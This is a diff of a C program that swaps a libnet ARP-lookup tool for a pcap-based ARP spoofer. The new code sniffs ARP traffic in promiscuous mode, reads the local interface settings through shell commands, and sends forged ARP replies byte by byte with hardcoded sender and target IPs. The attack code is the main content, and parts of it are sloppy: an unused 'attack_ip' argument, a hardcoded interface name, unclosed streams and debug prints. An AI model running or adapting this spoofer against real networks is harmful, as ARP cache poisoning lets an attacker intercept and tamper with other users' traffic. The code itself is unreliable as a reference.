@@ -1,196 +1,240 @@
 
-#include <libnet.h>
+
 #include <pcap.h>
 
-#define IP_UCHAR_COMP(x, y) \
-    (x[0] == y[0] && x[1] == y[1] && x[2] == y[2] && x[3] == y[3])
+#include <stdio.h>
+#include <arpa/inet.h>
+#include <stdlib.h>
+#include <string.h>
 
+#define ARP_REQUEST 1   /* ARP Request             */
+#define ARP_REPLY 2     /* ARP Reply               */
+#define MAX 1024
 
-u_char enet_dst[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
+int retToken(char* ori[], char* ptr);
+int retToken2(char* ori[], char* ptr);
 
-int libnet_do_arp(struct link_int *, u_char *, struct ether_addr *, u_long);
+    typedef struct arphdr {
+        u_int16_t htype;    /* Hardware Type           */
+        u_int16_t ptype;    /* Protocol Type           */
+        u_char hlen;        /* Hardware Address Length */
+        u_char plen;        /* Protocol Address Length */
+        u_int16_t oper;     /* Operation Code          */
+        u_char sha[6];      /* Sender hardware address */
+        u_char spa[4];      /* Sender IP address       */
+        u_char tha[6];      /* Target hardware address */
+        u_char tpa[4];      /* Target IP address       */
+    }arphdr_t;
 
-int
-main(int argc, char *argv[])
-{
-    int i, c;
-    char errbuf[256];
-    char *device = NULL;
-    struct link_int *l;
-    struct ether_addr e;
-    u_long ip;
-
-    while ((c = getopt(argc, argv, "i:")) != EOF)
+    int main(int argc, char *argv[])
     {
-        switch (c)
-        {
-            case 'i':
-                device = optarg;
+        pcap_t *handle, *out;			/* Session handle */
+        char *dev;			/* The device to sniff on */
+        char errbuf[PCAP_ERRBUF_SIZE];	/* Error string */
+        // char filter_exp[] = "port 80";	/* The filter expression */
+        bpf_u_int32 mask;		/* Our netmask */
+        bpf_u_int32 net;		/* Our IP */
+        struct pcap_pkthdr * hdr;
+        const u_char * packet;
+        int i = 1;
+        arphdr_t *arpheader = NULL;
+
+        FILE *fp_ip, *fp_mac, *fp_gw_ip;
+        int index, data;
+        char *inp, *inp2;
+        int buf_size = MAX;
+        char* ptr;
+        char attack_ip[16];
+        char* ch_ip[MAX], *ch_mac[MAX], *ch_gw_ip[MAX]; // 문자열이 들어갈 배열
+        u_char send_packet[100];
+
+        strncpy (attack_ip, argv[1], sizeof (attack_ip));
+
+        fp_ip = popen("ifconfig wlp1s0 | grep 'inet addr:' | cut -d: -f2 | awk '{print $1}'", "r");
+        fp_mac = popen("ifconfig wlp1s0 | awk '/HWaddr/ {print $5}'", "r");
+        fp_gw_ip = popen("route | grep default | awk '{print $2}'", "r");
+
+        inp = malloc(buf_size);
+        inp2 = malloc(buf_size);
+
+        while(fgets(inp,buf_size,fp_ip)){
+            index = retToken(ch_ip, inp);
+        }
+
+        for(data = 0 ; data < index ; data++){
+            printf("%s \n", ch_ip[data]);
+        }
+
+        while(fgets(inp2,buf_size,fp_mac)){
+            index = retToken2(ch_mac, inp2);
+        }
+
+        for(data = 0 ; data < index ; data++){
+            printf("%s \n", ch_mac[data]);
+        }
+
+        while(fgets(inp,buf_size,fp_gw_ip)){
+            index = retToken(ch_gw_ip, inp);
+        }
+
+        for(data = 0 ; data < index ; data++){
+            printf("%s \n", ch_gw_ip[data]);
+        }
+
+        fclose(fp_ip);  //////////////////////////////////////////////
+
+        //ip = (struct ip_header *)(packet + SIZE_ETHERNET);
+
+        /* Define the device */
+        dev = pcap_lookupdev(errbuf);    // device name look up
+        if (dev == NULL) {               // error
+            fprintf(stderr, "Couldn't find default device: %s\n", errbuf);
+            return(2);
+        }
+        printf("device : %s\n", dev);
+
+        /* Find the properties for the device */
+        if (pcap_lookupnet(dev, &net, &mask, errbuf) == -1) {
+            fprintf(stderr, "Couldn't get netmask for device %s: %s\n", dev, errbuf);
+            net = 0;
+            mask = 0;
+        }
+
+        /* Open the session in promiscuous mode */
+        handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
+        if (handle == NULL) {
+            fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
+            return(2);
+        }
+
+        /* Grab a packet */
+        while(1){
+            const int res = pcap_next_ex(handle, &hdr, &packet);
+            if(res<0)
                 break;
-            default:
-                exit(EXIT_FAILURE);
-        }
-    }
+            if(res==0)
+                continue;
 
-    if (!device)
-    {
-        fprintf(stderr, "Specify a device\n");
-        exit(EXIT_FAILURE);
-    }
-    if (argc > optind)
-    {
-        if ((ip = libnet_name_resolve(argv[optind], 1)) == -1)
-        {
-            fprintf(stderr, "Cannot resolve IP address\n");
-            exit(EXIT_FAILURE);
-        }
-    }
-    else
-    {
-        fprintf(stderr, "IP address to ARP for?\n");
-        exit(EXIT_FAILURE);
-    }
+        arpheader = (struct arphdr *)(packet+14); /* Point to the ARP header */
+        printf("Hardware type: %s\n", (ntohs(arpheader->htype) == 1) ? "Ethernet" : "Unknown");
+        printf("Protocol type: %s\n", (ntohs(arpheader->ptype) == 0x0800) ? "IPv4" : "Unknown");
+        printf("Operation: %s\n", (ntohs(arpheader->oper) == ARP_REQUEST)? "ARP Request" : "ARP Reply");
 
-    l = libnet_open_link_interface(device, errbuf);
-    if (!l)
-    {
-        fprintf(stderr, "libnet_open_link_interface: %s\n", errbuf);
-        exit(EXIT_FAILURE);
-    }
-
-    c = libnet_do_arp(l, device, &e, ip);
-    if (c != -1)
-    {
-        for (i = 0; i < 6; i++)
-        {
-            printf("%x", e.ether_addr_octet[i]);
-            if (i != 5)
-            {
-                printf(":");
+        /* If is Ethernet and IPv4, print packet contents */
+        if (ntohs(arpheader->htype) == 1 && ntohs(arpheader->ptype) == 0x0800){
+        printf("Sender MAC: ");
+        for(i=0; i<6;i++){
+            if(i==5){
+                printf("%02X", arpheader->sha[i]);
+                break;
             }
+            printf("%02X:", arpheader->sha[i]);
+        }
+
+        printf("\nSender IP: ");
+        for(i=0; i<4;i++){
+            if(i==3){
+                printf("%d", arpheader->spa[i]);
+                break;
+            }
+            printf("%d.", arpheader->spa[i]);
+        }
+
+        printf("\nTarget MAC: ");
+        for(i=0; i<6;i++){
+            if(i==5){
+                printf("%02X", arpheader->tha[i]);
+                break;
+            }
+            printf("%02X:", arpheader->tha[i]);
+        }
+
+        printf("\nTarget IP: ");
+        for(i=0; i<4; i++){
+            if(i==3){
+                printf("%d", arpheader->tpa[i]);
+                break;
+            }
+            printf("%d.", arpheader->tpa[i]);
         }
         printf("\n");
-    }
-    return (c == -1 ? EXIT_FAILURE : EXIT_SUCCESS);
-}
+      }
 
+        out = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
+        if(ntohs(arpheader->oper) == ARP_REPLY){
 
-int libnet_do_arp(struct link_int *l, u_char *device, struct ether_addr *e,
-        u_long ip)
-{
-    int n, i;
-    u_char *buf, errbuf[256], *packet, *ip_p;
-    struct libnet_ethernet_hdr *p;
-    struct libnet_arp_hdr *a;
-    u_long local_ip;
-    pcap_t *pd;
-    struct pcap_pkthdr pc_hdr;
+        send_packet[0]=arpheader->sha[0];
+        send_packet[1]=arpheader->sha[1];
+        send_packet[2]=arpheader->sha[2];
+        send_packet[3]=arpheader->sha[3];
+        send_packet[4]=arpheader->sha[4];
+        send_packet[5]=arpheader->sha[5];
+        send_packet[6]=arpheader->tha[0];
+        send_packet[7]=arpheader->tha[1];
+        send_packet[8]=arpheader->tha[2];
+        send_packet[9]=arpheader->tha[3];
+        send_packet[10]=arpheader->tha[4];
+        send_packet[11]=arpheader->tha[5];
+        send_packet[12]=0x08;               // type : arp
+        send_packet[13]=0x06;
+        send_packet[14]=0x00;               // hardware type
+        send_packet[15]=0x01;
+        send_packet[16]=0x08;
+        send_packet[17]=0x00;               // protocol type
+        send_packet[18]=0x06;               // hardware size
+        send_packet[19]=0x04;               // protocol size
+        send_packet[20]=0x00;               // reply
+        send_packet[21]=0x02;
+        send_packet[22]=arpheader->tha[0];
+        send_packet[23]=arpheader->tha[1];
+        send_packet[24]=arpheader->tha[2];
+        send_packet[25]=arpheader->tha[3];
+        send_packet[26]=arpheader->tha[4];
+        send_packet[27]=arpheader->tha[5];
+        send_packet[28]=0xc0;               // sender ip
+        send_packet[29]=0xa8;
+        send_packet[30]=0Xda;
+        send_packet[31]=0x25;
+        send_packet[32]=arpheader->sha[0];
+        send_packet[33]=arpheader->sha[1];
+        send_packet[34]=arpheader->sha[2];
+        send_packet[35]=arpheader->sha[3];
+        send_packet[36]=arpheader->sha[4];
+        send_packet[37]=arpheader->sha[5];
+        send_packet[38]=0xc0;               // target ip
+        send_packet[39]=0xa8;
+        send_packet[40]=0X2B;
+        send_packet[41]=0xAB;
+        printf ("success??");
 
-    /*
-     *  Initialize a packet.
-     */
-    if (libnet_init_packet(ARP_H + ETH_H, &buf) == -1)
-    {
-        perror("libnet_init_packet memory:");
-        exit(EXIT_FAILURE);
-    }
-
-    /*
-     *  Get the ethernet address of the device.
-     */
-    e = libnet_get_hwaddr(l, device, errbuf);
-    if (e == NULL)
-    {
-        fprintf(stderr, "libnet_get_hwaddr: %s\n", errbuf);
-        return (-1);
-    }
-
-    /*
-     *  Get the IP address of the device.
-     */
-    local_ip = htonl(libnet_get_ipaddr(l, device, errbuf));
-    if (!local_ip)
-    {
-        fprintf(stderr, "libnet_get_ipaddr: %s\n", errbuf);
-        return (-1);
-    }
-
-    /*
-     *  Open the pcap device.
-     */
-    pd = pcap_open_live(device, ARP_H + ETH_H, 1, 500, errbuf);
-    if (pd == NULL)
-    {
-        fprintf(stderr, "pcap_open_live: %s\n", errbuf);
-        return (-1);
-    }
-
-    /*
-     *  Ethernet header
-     */
-    libnet_build_ethernet(
-            enet_dst,               /* broadcast ethernet address */
-            e->ether_addr_octet,    /* source ethernet address */
-            ETHERTYPE_ARP,          /* this frame holds an ARP packet */
-            NULL,                   /* payload */
-            0,                      /* payload size */
-            buf);                   /* packet header memory */
-
-    /*
-     *  ARP header
-     */
-    libnet_build_arp(
-            ARPHRD_ETHER,           /* hardware address type */
-            ETHERTYPE_IP,           /* protocol address type */
-            ETHER_ADDR_LEN,         /* hardware address length */
-            4,                      /* protocol address length */
-            ARPOP_REQUEST,          /* packet type - ARP request */
-            e->ether_addr_octet,    /* source (local) ethernet address */
-            (u_char *)&local_ip,    /* source (local) IP address */
-            enet_dst,               /* target's ethernet address (broadcast) */
-            (u_char *)&ip,          /* target's IP address */
-            NULL,                   /* payload */
-            0,                      /* payload size */
-            buf + ETH_H);           /* packet header memory */
-
-    n = libnet_write_link_layer(l, device, buf, ARP_H + ETH_H);
-    if (n == -1)
-    {
-        fprintf(stderr, "libnet_write_link_layer choked\n");
-        return (-1);
-    }
-    printf("Sent a %d byte ARP request looking for the MAC of %s.\n",
-        n, host_lookup(ip, 0));
-    printf("Waiting for a response...\n");
-
-    for (;(packet = ((u_char *)pcap_next(pd, &pc_hdr)));)
-    {
-        p = (struct libnet_ethernet_hdr *)(packet);
-        if (ntohs(p->ether_type) == ETHERTYPE_ARP)
-        {
-            a = (struct libnet_arp_hdr *)(packet + ETH_H);
-            if (ntohs(a->ar_op) == ARPOP_REPLY)
-            {
-                ip_p = (u_char *)&ip;
-                if (IP_UCHAR_COMP(a->ar_spa, ip_p))
-                {
-                    printf("Target hardware address: ");
-                    for (i = 0; i < 6; i++)
-                    {
-                        printf("%x", a->ar_sha[i]);
-                        if (i != 5)
-                        {
-                            printf(":");
-                        }
-                    }
-                    printf("\n");
-                }
-            }
+        pcap_sendpacket(out,send_packet,42);
         }
+      }
+        /* And close the session */
+        pcap_close(handle);
+        pcap_close(out);
+        return(0);
     }
 
-    libnet_destroy_packet(&buf);
-    return (n);
-}
+    int retToken(char* ori[] , char *inp){
+            int i = 0;
+            char* ptr = strtok(inp, ".");
+            while(ptr != NULL){
+                    ori[i] = ptr;
+                    ptr = strtok(NULL, ".");
+                    i++;
+            }
+            return i;
+    }
 
-/* EOF */
+    int retToken2(char* ori[], char *inp){
+            int i=0;
+            char* ptr = strtok(inp, ":");
+            while(ptr != NULL){
+                ori[i] = ptr;
+                ptr = strtok(NULL, ":");
+                i++;
+            }
+            return i;
+    }
+
